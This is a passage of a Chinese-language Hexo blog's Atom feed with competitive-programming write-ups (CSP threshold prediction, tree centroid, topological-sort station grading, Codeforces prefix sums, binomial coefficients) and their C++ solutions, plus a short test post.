&lt;h3 id=&quot;样例解释&quot;&gt;&lt;a href=&quot;#样例解释&quot; class=&quot;headerlink&quot; title=&quot;样例解释&quot;&gt;&lt;/a&gt;样例解释&lt;/h3&gt;&lt;p&gt;由于传送门的存在, 从 (1,1) 出发到终点 (2,2)(2,2) 只需要一步; 而从(1,2) 和 (2,1) 出发也只需要向下/右走一步; 从 (2,2) 出发需要 0 步。所以步数期望为 1+1+1+02×2=0.752×21+1+1+0=0.75&lt;/p&gt;</summary>
    
    
    
    <category term="算法题" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    
    
    <category term="dp" scheme="http://example.com/tags/dp/"/>
    
    <category term="蓝桥杯" scheme="http://example.com/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/"/>
    
    <category term="bfs" scheme="http://example.com/tags/bfs/"/>
    
  </entry>
  
  <entry>
    <title>【CSP】期末预测之最佳阈值</title>
    <link href="http://example.com/2023/01/19/%E3%80%90CSP%E3%80%91%E6%9C%9F%E6%9C%AB%E9%A2%84%E6%B5%8B%E4%B9%8B%E6%9C%80%E4%BD%B3%E9%98%88%E5%80%BC/"/>
    <id>http://example.com/2023/01/19/%E3%80%90CSP%E3%80%91%E6%9C%9F%E6%9C%AB%E9%A2%84%E6%B5%8B%E4%B9%8B%E6%9C%80%E4%BD%B3%E9%98%88%E5%80%BC/</id>
    <published>2023-01-19T11:47:09.000Z</published>
    <updated>2023-01-19T12:08:44.127Z</updated>
    
    <content type="html"><![CDATA[<p>题目来源：csp 202012-2</p><span id="more"></span><p><img src="1.png" alt="1"></p><h2 id="样例1输入"><a href="#样例1输入" class="headerlink" title="样例1输入"></a>样例1输入</h2><pre><code class="lang-data">60 01 01 13 15 17 1</code></pre><h2 id="样例1输出"><a href="#样例1输出" class="headerlink" title="样例1输出"></a>样例1输出</h2><pre><code class="lang-data">3</code></pre><p>对于输入的数据，并没有说第一个数是按照升序排列的，因此我们需要先进行一个排序，按照输出的一行数中第一个数的大小（y的值）进行排序。</p><h2 id="70分做法"><a href="#70分做法" class="headerlink" title="70分做法"></a>70分做法</h2><p>两个for循环，分别假设每个y为阈值的情况下，获得的准确度是多少，代码比较好写，就不进行演示了。</p><h2 id="100分做法"><a href="#100分做法" class="headerlink" title="100分做法"></a>100分做法</h2><p>首先进行思考，什么样的阈值才能满足准确度最大？换而言之，设置一个阈值y，是不是小于y的同学，如果他的result是0的话就不用变，也就是正确的预测值，如果大于1就会发生变化，则预测失败。而题目中我们只需要知道这个阈值y到底能预测对多少个同学，也就是多少个同学的result值不用发生变化。那么很简便的一个方法，就是统计小于y的同学中有多少result为1的，<code>大于等于</code>这个y的，有多少result为0的。</p><p>统计的方式有很多，例如可以设置一个全局的sum变量或者开辟数组，这里就用到了前缀和的一个思想。为了避免参数之间混乱，还是开数组比较清晰，用f1[i]记录y小于i的同学中result为1的个数，f0[i]为y小于i的同学中，result为0的个数，如果所有的同学中，result为0的同学共有sum0个，那么预测的准确次数可以由下式表示：</p><pre><code>right_times = n - (f1[i] + sum0 - f0[i])</code></pre><p><del>那么剩下的就是大模拟了罢。</del></p><p>我们以样例1为例，算法的过程如下：</p><pre><code>sum0 = 2, n = 6y     result    f0    f1    sum0 - f0    right_times0     0        0    0    2            41     0        1    0    1            51     1        1    0    1            53     1        2    1    0            55     1        2    2    0            47     1        2    3    0            3</code></pre><p>那么最终答案就是3。我们在遍历排好序的时候，只需维护上面的一些变量就行了，但这题其实还有一个麻烦的点，就是y值相同的数据可能有多个，不过这里我们可以用双指针来处理（感觉csp第二题挺喜欢这种数据的）。</p><p>AC代码如下：</p><pre><code class="lang-C++">#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;struct Node&#123;    int y;    int res;&#125;;Node in[100005];int sum0 = 0; // 记录0的个数int sum1 = 0;int f0[100005], f1[100005]; bool cmp(const struct Node &amp;a, const struct Node &amp;b)&#123;    return a.y &lt; b.y;&#125;int main()&#123;    int n;    cin &gt;&gt; n;    for (int i = 1; i &lt;= n; i++)    &#123;        cin &gt;&gt; in[i].y &gt;&gt; in[i].res;        if (!in[i].res) sum0++;    &#125;    sum1 = n - sum0;    sort(in + 1, in + n + 1, cmp);    int i = 1;    int ans = 0;    int max_right = 0;    int num1, num0;    num0 = num1 = 0;    while (i &lt;= n &amp;&amp; in[1].y != in[i].y)    &#123;        if (in[i].res) num1++;        else num0++;        i++;    &#125;    f0[i - 1] = f1[i - 1] = 0;    // 实际上对于多个相同的y值的同学，只需更新头和尾，用于和其他数据交互就行了    while (i &lt;= n)    &#123;        int p = i - 1; // 保存前一个y        f0[i] = f0[p] + num0, f1[i] = f1[p] + num1; // 先用前一个同学的num0和num1去更新f数组        num0 = num1 = 0;  // 因为这里要重新初始化，所以上一步才需立即进行处理        while (i &lt;= n &amp;&amp; in[p + 1].y == in[i].y)        &#123;            if (in[i].res) num1++; // 统计当前y值下的所有同学中result为1的个数            else num0++;    // 统计当前y值下的所有同学中result为0的个数            i++;        &#125;        f0[i - 1] = f0[p + 1], f1[i - 1] = f1[p + 1];  // y值的最后一个同学进行更新        int right = n - (f1[i - 1] + sum0 - f0[i - 1]);        if (right &gt;= max_right)        &#123;            max_right = right;            ans = in[i - 1].y;        &#125;    &#125;    cout &lt;&lt; ans &lt;&lt; endl;&#125;</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;题目来源：csp 202012-2&lt;/p&gt;</summary>
    
    
    
    <category term="算法题" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    
    
    <category term="前缀和" scheme="http://example.com/tags/%E5%89%8D%E7%BC%80%E5%92%8C/"/>
    
    <category term="csp" scheme="http://example.com/tags/csp/"/>
    
  </entry>
  
  <entry>
    <title>【OJ】Balance Ac</title>
    <link href="http://example.com/2023/01/17/%E3%80%90OJ%E3%80%91Balance-Ac/"/>
    <id>http://example.com/2023/01/17/%E3%80%90OJ%E3%80%91Balance-Ac/</id>
    <published>2023-01-17T13:08:40.000Z</published>
    <updated>2023-01-17T13:25:06.860Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><span id="more"></span><p><img src="1.png" alt="1"></p><p>题目所指示的实际上就是求树的重心。</p><p>以下摘自oi-wiki：</p><pre><code>定义对于树上的每一个点，计算其所有子树中最大的子树节点数，这个值最小的点就是这棵树的重心。（这里以及下文中的“子树”都是指无根树的子树，即包括“向上”的那棵子树，并且不包括整棵树自身。）性质以树的重心为根时，所有子树的大小都不超过整棵树大小的一半。树中所有点到某个点的距离和中，到重心的距离和是最小的；如果有两个重心，那么到它们的距离和一样。把两棵树通过一条边相连得到一棵新的树，那么新的树的重心在连接原来两棵树的重心的路径上。在一棵树上添加或删除一个叶子，那么它的重心最多只移动一条边的距离。</code></pre><p>但其实这题的思路就是用搜索去求每个结点的balance，然后依次遍历，输出balance最小的结点。（感觉遇到图的题，总觉得直接搜索会超时。。。）。</p><p>定义数据结构Tree如下：</p><pre><code class="lang-c++">struct  Tree&#123;    int balance;    vector&lt;int&gt; next;&#125;;</code></pre><p>在dfs过程中，我们需要计算的数据有子树的结点数tmp，最大字数的结点数size，所有子树的结点数之和sum以及题目要求的balance。</p><p>tmp的计算通过dfs进行更新，size则取最大的tmp值，以及sum，这些参数通过遍历即可计算。而balance的计算，通过比较size和N - sum - 1；之所以这样计算，是因为在dfs的过程中，我们初始已经假设某个点作为根节点，因此获得的子树的结点个数都是遍历当前结点的子节点来获取的，但其实如果把当前结点看作根节点的话，其父节点向上的所有结点也是一个子树，而其结点个数正是N - sum - 1。以题目中图为例，如果2作为根节点，则计算1的balance时，不仅需要遍历1的子树，还需要遍历1的父节点2和6构成的子树。</p><p>最后完整代码如下：</p><pre><code class="lang-c++">#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int visit[20005];int n;struct  Tree&#123;    int balance;    vector&lt;int&gt; next;&#125;;int dfs(Tree *tree, int x)&#123;    if (visit[x]) return 0;    else    &#123;        visit[x] = 1;        int size = 0;        int sum = 0;        for (int i = 0; i &lt; tree[x].next.size(); i++)        &#123;            int tmp = dfs(tree, (tree[x].next)[i]); // 子树的结点个数            sum += tmp;            size = max(size, tmp); // 最大子树的结点个数        &#125;        tree[x].balance = max(size, n - sum - 1); // 计算balance        visit[x] = 0;        return sum + 1;     &#125;&#125;int main()&#123;    int t;    cin &gt;&gt; t;    while (t--)    &#123;        cin &gt;&gt; n;        Tree *tree = new Tree[n + 1];        for (int i = 1; i &lt;= n; i++)            visit[i] = 0;        for (int i = 1; i &lt;= n - 1; i++)        &#123;            int a, b;            cin &gt;&gt; a &gt;&gt; b;            tree[a].next.push_back(b);            tree[b].next.push_back(a);            tree[a].balance = tree[b].balance = 0;        &#125;        dfs(tree, 6);        int ans1, ans2;        ans1 = ans2 = 1e8;        for (int i = 1; i &lt;= n; i++)            if (ans2 &gt; tree[i].balance)                ans1 = i, ans2 = tree[i].balance;        cout &lt;&lt; ans1 &lt;&lt; &quot; &quot; &lt;&lt; ans2 &lt;&lt; endl;        delete []tree;    &#125;    system(&quot;pause&quot;);&#125;</code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h1&gt;</summary>
    
    
    
    <category term="算法题" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    
    
    <category term="树" scheme="http://example.com/tags/%E6%A0%91/"/>
    
    <category term="搜索" scheme="http://example.com/tags/%E6%90%9C%E7%B4%A2/"/>
    
  </entry>
  
  <entry>
    <title>【OJ】车站分级</title>
    <link href="http://example.com/2023/01/17/%E3%80%90OJ%E3%80%91%E8%BD%A6%E7%AB%99%E5%88%86%E7%BA%A7/"/>
    <id>http://example.com/2023/01/17/%E3%80%90OJ%E3%80%91%E8%BD%A6%E7%AB%99%E5%88%86%E7%BA%A7/</id>
    <published>2023-01-17T12:08:05.000Z</published>
    <updated>2023-01-17T12:36:21.160Z</updated>
    
    <content type="html"><![CDATA[<p><strong>原题链接</strong></p><p><a href="https://www.luogu.com.cn/problem/P1983">P1983 [NOIP2013 普及组] 车站分级 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)</a></p><span id="more"></span><p><img src="1.png" alt="1"></p><h2 id="输入输出样例"><a href="#输入输出样例" class="headerlink" title="输入输出样例"></a>输入输出样例</h2><p><strong>输入 #1</strong>复制</p><pre><code>9 2 4 1 3 5 6 3 3 5 6</code></pre><p><strong>输出 #1</strong>复制</p><pre><code>2</code></pre><p><strong>输入 #2</strong>复制</p><pre><code>9 3 4 1 3 5 6 3 3 5 6 3 1 5 9</code></pre><p><strong>输出 #2</strong>复制</p><pre><code>3</code></pre><p>题目中关键点：</p><pre><code>如果这趟车次停靠了火车站x，则始发站、终点站之间所有级别大于等于火车站x的都必须停靠</code></pre><p>以样例1来说，第一趟火车停在了1，3，5，6，则站点2、4的级别均小于1、3、5、6；第二趟车停在了3、5、6，则4的级别小于3、5、6。那么我们可以得到这样的级别关系：</p><pre><code>&#123;2, 4&#125; &lt; &#123;1, 3, 5, 6&#125;&#123;4&#125; &lt; &#123;3, 5, 6&#125;</code></pre><p>只知道2、4分别和1、3、5、6的关系，但不知道2和4的具体关系，以及1、3、5、6的关系，这种类型的排序正是拓扑排序，因此这道题显而易见的要使用到拓扑排序。</p><p>但是知道拓扑排序很简单，但重要的是怎么从拓扑排序中获得这些车站的级别关系。根据题目要求，我们最终要获得拓扑排序的最长链才行，以此来设计的车站级别个数才会最少。</p><p>在这里采用一个动态规划的思路，以下图为例：</p><p><img src="2.webp" alt="2"></p><p>设f(i)为从<code>入度为0</code>的结点到i结点的最长距离（经过的结点个数最多），那么在拓扑排序的中途，我们用f数组维护这样一个长度最大值。比如上图中，方位结点1后，去放分结点2和4（即2、4入队列），然后更新f(2)和f(4)为1。接着访问结点2指向的结点，会访问到结点4，此时有f(4) = max(f(4), f(2) + 1)，最终结果是更新f(4)为2，相关的代码部分如下：</p><pre><code class="lang-c++">for (int j = 0; j &lt; g[x].size(); j++)&#123;    // 删去x -&gt; t这条边    int t = g[x][j];     f[t] = max(f[t], f[x] + 1);  // 更新到达结点t所经过的最长的路径    du[t]--;    if (!du[t]) q.push(t);&#125;</code></pre><p>找到最长的路径后，路径的长度 + 1即为最终的答案（+1细品）。</p><p>完整代码如下：</p><pre><code class="lang-c++">#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;vector&gt;#include &lt;queue&gt;using namespace std;int f[1005] = &#123;0&#125;;vector&lt;int&gt; g[1005];  // 邻接表int du[1005], n, m, L[1005];int visti[1005][1005] = &#123;&#123;0&#125;&#125;; // visit用于判重，否则会MLEbool toposort()&#123;    memset(du, 0, sizeof(du));    for (int i = 0; i &lt; n; i++)        for (int j = 0; j &lt; g[i].size(); j++)            du[g[i][j]]++;    int tot = 0;    queue&lt;int&gt; q;    for (int i = 1; i &lt;= n; i++)        if (!du[i]) q.push(i), f[i] = 0;    while (!q.empty())    &#123;        int x = q.front(); q.pop();        L[tot++] = x;         for (int j = 0; j &lt; g[x].size(); j++)        &#123;            // 删去x -&gt; t这条边            int t = g[x][j];             f[t] = max(f[t], f[x] + 1);            du[t]--;            if (!du[t]) q.push(t);        &#125;    &#125;    if (tot == n) return 1;    return 0;&#125;int main()&#123;    cin &gt;&gt; n &gt;&gt; m;    for (int k = 1; k &lt;= m; k++)    &#123;        int s;        cin &gt;&gt; s;        int a[1005] = &#123;0&#125;;        int pos[1005] = &#123;0&#125;;        for (int i = 1; i &lt;= s; i++)            cin &gt;&gt; a[i], pos[a[i]] = 1;        for (int i = a[1]; i &lt;= a[s]; i++)            if (!pos[i])                 for (int j = a[1]; j &lt;= a[s]; j++)                    if (pos[j] &amp;&amp; !visti[i][j]) g[i].push_back(j), visti[i][j] = 1;    &#125;    toposort();    int ans = 0;    for (int i = 1; i &lt;= n; i++)        ans = max(ans, f[i]);    cout &lt;&lt; ans + 1 &lt;&lt; endl;    //system(&quot;pause&quot;);&#125;</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;原题链接&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.luogu.com.cn/problem/P1983&quot;&gt;P1983 [NOIP2013 普及组] 车站分级 - 洛谷 | 计算机科学教育新生态 (luogu.com.cn)&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="算法题" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    
    
    <category term="拓扑排序" scheme="http://example.com/tags/%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>【OJ】Least Prefix Sum</title>
    <link href="http://example.com/2023/01/15/%E3%80%90OJ%E3%80%91Least-Prefix-Sum/"/>
    <id>http://example.com/2023/01/15/%E3%80%90OJ%E3%80%91Least-Prefix-Sum/</id>
    <published>2023-01-15T15:18:28.000Z</published>
    <updated>2023-01-15T15:59:01.128Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://codeforces.com/problemset/problem/1779/C">Problem - 1779C - Codeforces</a></p><p><img src="1.png" alt="1"></p><span id="more"></span><p>该题大概的意思是，通过将数组中的元素取反，使得给定一个m，其前缀和a1 + a2 + … + am的值在该数组的所有前缀和中最小。</p><p>对于前缀和的问题，写出表达式会比较明显，设i的前缀和为sum[i] = a[1] + a[2] + a[3] + … + a[i]。根据题意可知最终操作后m需满足，sum[m] &lt;= sum[k]，1 &lt;= k &lt;= n。 </p><p>首先对于k &lt;= m的情况，有sum[m] &lt;= sum[k] —&gt; sum[m] - sum[k] &lt;= 0；</p><p>同理对于k &gt; m的情况，有sum[k] - sum[m] &gt;= 0。</p><p>因此我们的取反操作需要满足以上两个条件，这里采用了一个贪心的思维，以k &lt;= m的情况为例，要令sum[m] - sum[k] &lt;= 0，我们肯定希望sum[k]越大越好，在取反操作时，为节省次数，一定是希望选取a[1]到a[k]中最小的负数，让其取反，这样sum[k]就相对会变得更大。为寻找这样一个最小的负数，可以使用优先队列来节省时间，那么这部分的代码可以写成：</p><pre><code class="lang-c++">priority_queue&lt;ll&gt; q1;// sum(k1 + 1, m) &lt;= 0, k1 &gt;= 1for (int i = m; i &gt;= 2; i--)&#123;    q1.push(arr[i]);    sum += arr[i];    if (sum &gt; 0) // 这里要维持sum(k1 + 1, m) &lt;= 0的条件    &#123;        sum -= 2 * abs(q1.top());        q1.pop();        ans++;    &#125; &#125;</code></pre><p>在这里，我们需要倒叙遍历i，其实也就是sum(k1 + 1, m)的长度不断的递增（为什么这样做，感觉就是潜意识就这样想了。。。）。</p><p>同样对于k &gt; m的操作，顺序遍历i，然后保持每一个sum大于0就行了。</p><p>AC代码如下：</p><pre><code class="lang-c++">#include &lt;iostream&gt;#include &lt;queue&gt;#include &lt;cmath&gt;using namespace std;typedef long long int ll;ll arr[200005] = &#123;0&#125;;ll sum = 0;int main()&#123;    ll t, m, n;    cin &gt;&gt; t;    for (int k = 1; k &lt;= t; k++)    &#123;        cin &gt;&gt; n &gt;&gt; m;        int ans = 0;        priority_queue&lt;ll&gt; q1;        priority_queue&lt;ll, vector&lt;ll&gt;, greater&lt;ll&gt; &gt; q2;        for (int i = 1; i &lt;= n; i++)            cin &gt;&gt; arr[i];        if (n == 1)        &#123;            cout &lt;&lt; 0 &lt;&lt; endl;            continue;;        &#125;        sum = 0;        // sum(k1 + 1, m) &lt;= 0, k1 &gt;= 1        for (int i = m; i &gt;= 2; i--)        &#123;            q1.push(arr[i]);            sum += arr[i];            if (sum &gt; 0)            &#123;                sum -= 2 * abs(q1.top());                q1.pop();                ans++;            &#125;         &#125;        sum = 0;        // sum(m + 1, k2) &lt;= 0, k2 &lt;= n        for (int i = m + 1; i &lt;= n; i++)        &#123;            q2.push(arr[i]);            sum += arr[i];            if (sum &lt; 0)            &#123;                sum += 2 * abs(q2.top());                q2.pop();                ans++;            &#125;        &#125;        cout &lt;&lt; ans &lt;&lt; endl;    &#125;    system(&quot;pause&quot;);    return 0;&#125;</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://codeforces.com/problemset/problem/1779/C&quot;&gt;Problem - 1779C - Codeforces&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;1.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="算法题" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    
    
    <category term="前缀和" scheme="http://example.com/tags/%E5%89%8D%E7%BC%80%E5%92%8C/"/>
    
    <category term="优先队列" scheme="http://example.com/tags/%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>【OJ】计算系数</title>
    <link href="http://example.com/2023/01/14/%E3%80%90OJ%E3%80%91%E8%AE%A1%E7%AE%97%E7%B3%BB%E6%95%B0/"/>
    <id>http://example.com/2023/01/14/%E3%80%90OJ%E3%80%91%E8%AE%A1%E7%AE%97%E7%B3%BB%E6%95%B0/</id>
    <published>2023-01-14T15:33:10.000Z</published>
    <updated>2023-01-15T15:59:03.038Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h1 id="NOIP2011-提高组-计算系数"><a href="#NOIP2011-提高组-计算系数" class="headerlink" title="[NOIP2011 提高组] 计算系数"></a>[NOIP2011 提高组] 计算系数</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>给定一个多项式 $(by+ax)^k$，请求出多项式展开后 $x^n\times y^m$ 项的系数。</p><h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入共一行，包含 $5$ 个整数，分别为 $a,b,k,n,m$，每两个整数之间用一个空格隔开。</p><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出共一行，包含一个整数，表示所求的系数。</p><p>这个系数可能很大，输出对 $10007$ 取模后的结果。</p><h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><pre><code>1 1 3 1 2</code></pre><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><pre><code>3</code></pre><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>【数据范围】</p><p>对于 $30\%$ 的数据，有 $ 0\le k\le 10$。</p><p>对于 $50\%$ 的数据，有 $ a=1$，$b=1$。</p><p>对于 $100\%$ 的数据，有 $0\le k\le 1000$，$0\le n,m\le k$，$n+m=k$，$0\le a,b\le 10^6$。</p><p>noip2011 提高组 day2 第 1 题。</p></blockquote><span id="more"></span><p>第一眼思路：Cnm排列组合+快速模幂，然而太天真了。。。</p><p>如果用Cnm的话，会牵扯到除法的模幂运算，然后又是逆元一些乱七八槽的玩意（不过有老哥貌似能推出来其他的计算公式）。</p><p>既然Cnm走不通，那就去<del>百度</del>思考其他的方法。先考虑a和b均为1的形式：</p><pre><code>(x + y)^1 = x + y(x + y)^2 = x^2 + 2xy + y^2(x + 3)^3 = x^3 + 3xy^2 + 3x^2y + y^3</code></pre><p>这样看可能不太明显，换一种表达方式 </p><pre><code>1 11 2 11 3 3 1</code></pre><p>似乎是杨辉三角。。。根据初中的知识，杨辉三角是和二项式定理紧密相关的。</p><p><img src="1.png" alt="1"></p><p>那么事情就好办很多，直接dp，设杨辉三角的二维数组表达形式为<code>f(i, j)</code>，那么最终答案的表达式应该是：</p><p>ans = f(i, j) <em> a^n </em> b^m，最终代码如下：</p><pre><code class="lang-c++">#include &lt;iostream&gt;using namespace std;#define MOD (10007)typedef unsigned long long int ll;ll f[1005][1005] = &#123;&#123;0&#125;&#125;;ll a, b, k, n, m;void fun()&#123;    f[1][1] = 1;    for (ll i = 2; i &lt;= 1001; i++)    &#123;        f[i][1] = f[i][i] = 1;        for (ll j = 2; j &lt;= i - 1; j++)            f[i][j] = (f[i - 1][j - 1] + f[i - 1][j]) % MOD;     &#125;&#125;ll quick_pow(ll x, ll y)&#123;    ll ans = 1;    while (y)    &#123;        if (y &amp; 1)            ans = ans * x % MOD;        x = (x * x) % MOD;        y &gt;&gt;= 1;    &#125;    return ans;&#125;int main()&#123;    fun();    cin &gt;&gt; a &gt;&gt; b &gt;&gt; k &gt;&gt; n &gt;&gt; m;    // x^n X y^m    cout &lt;&lt; (f[k + 1][m + 1] * (quick_pow(a, n) * quick_pow(b, m) % MOD)) % MOD &lt;&lt; endl;&#125;</code></pre>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;h1 id=&quot;NOIP2011-提高组-计算系数&quot;&gt;&lt;a href=&quot;#NOIP2011-提高组-计算系数&quot; class=&quot;headerlink&quot; title=&quot;[NOIP2011 提高组] 计算系数&quot;&gt;&lt;/a&gt;[NOIP2011 提高组] 计算系数&lt;/h1&gt;&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h2&gt;&lt;p&gt;给定一个多项式 $(by+ax)^k$，请求出多项式展开后 $x^n\times y^m$ 项的系数。&lt;/p&gt;
&lt;h2 id=&quot;输入格式&quot;&gt;&lt;a href=&quot;#输入格式&quot; class=&quot;headerlink&quot; title=&quot;输入格式&quot;&gt;&lt;/a&gt;输入格式&lt;/h2&gt;&lt;p&gt;输入共一行，包含 $5$ 个整数，分别为 $a,b,k,n,m$，每两个整数之间用一个空格隔开。&lt;/p&gt;
&lt;h2 id=&quot;输出格式&quot;&gt;&lt;a href=&quot;#输出格式&quot; class=&quot;headerlink&quot; title=&quot;输出格式&quot;&gt;&lt;/a&gt;输出格式&lt;/h2&gt;&lt;p&gt;输出共一行，包含一个整数，表示所求的系数。&lt;/p&gt;
&lt;p&gt;这个系数可能很大，输出对 $10007$ 取模后的结果。&lt;/p&gt;
&lt;h2 id=&quot;样例-1&quot;&gt;&lt;a href=&quot;#样例-1&quot; class=&quot;headerlink&quot; title=&quot;样例 #1&quot;&gt;&lt;/a&gt;样例 #1&lt;/h2&gt;&lt;h3 id=&quot;样例输入-1&quot;&gt;&lt;a href=&quot;#样例输入-1&quot; class=&quot;headerlink&quot; title=&quot;样例输入 #1&quot;&gt;&lt;/a&gt;样例输入 #1&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;1 1 3 1 2
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;样例输出-1&quot;&gt;&lt;a href=&quot;#样例输出-1&quot; class=&quot;headerlink&quot; title=&quot;样例输出 #1&quot;&gt;&lt;/a&gt;样例输出 #1&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;3
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;提示&quot;&gt;&lt;a href=&quot;#提示&quot; class=&quot;headerlink&quot; title=&quot;提示&quot;&gt;&lt;/a&gt;提示&lt;/h2&gt;&lt;p&gt;【数据范围】&lt;/p&gt;
&lt;p&gt;对于 $30\%$ 的数据，有 $ 0\le k\le 10$。&lt;/p&gt;
&lt;p&gt;对于 $50\%$ 的数据，有 $ a=1$，$b=1$。&lt;/p&gt;
&lt;p&gt;对于 $100\%$ 的数据，有 $0\le k\le 1000$，$0\le n,m\le k$，$n+m=k$，$0\le a,b\le 10^6$。&lt;/p&gt;
&lt;p&gt;noip2011 提高组 day2 第 1 题。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="算法题" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95%E9%A2%98/"/>
    
    
    <category term="dp" scheme="http://example.com/tags/dp/"/>
    
    <category term="数论" scheme="http://example.com/tags/%E6%95%B0%E8%AE%BA/"/>
    
  </entry>
  
  <entry>
    <title>测试文件</title>
    <link href="http://example.com/2023/01/13/%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6/"/>
    <id>http://example.com/2023/01/13/%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6/</id>
    <published>2023-01-13T14:37:32.000Z</published>
    <updated>2023-03-22T14:42:19.752Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文章测试部分"><a href="#文章测试部分" class="headerlink" title="文章测试部分"></a>文章测试部分</h1><p>用于测试hexo的搭建</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>test</p><pre><code class="lang-python">import testprint(&quot;hello world&quot;)</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文章测试部分&quot;&gt;&lt;a href=&quot;#文章测试部分&quot; class=&quot;headerlink&quot; title=&quot;文章测试部分&quot;&gt;&lt;/a&gt;文章测试部分&lt;/h1&gt;&lt;p&gt;用于测试hexo的搭建&lt;/p&gt;
&lt;h2 id=&quot;测试&quot;&gt;&lt;a href=&quot;#测试&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="测试文件" scheme="http://example.com/categories/%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6/"/>
    
    
    <category term="test" scheme="http://example.com/tags/test/"/>
    
    <category term="hello world" scheme="http://example.com/tags/hello-world/"/>
    
  </entry>
  
</feed>
